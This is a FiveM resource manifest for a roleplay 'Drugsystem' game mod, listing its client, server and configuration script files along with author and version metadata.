fx_version 'cerulean'
games { 'rdr3', 'gta5' }

author 'VENI#0999'
description 'Drugsystem af veni'
version '1.0.0'

client_scripts {
    'language.lua',
    'src/cl_main.lua'
}
server_scripts {
    '@mysql-async/lib/MySQL.lua',
    'language.lua',
    'src/sv_main.lua',
    'config.lua'
}
client_script "ph1ll1p.lua"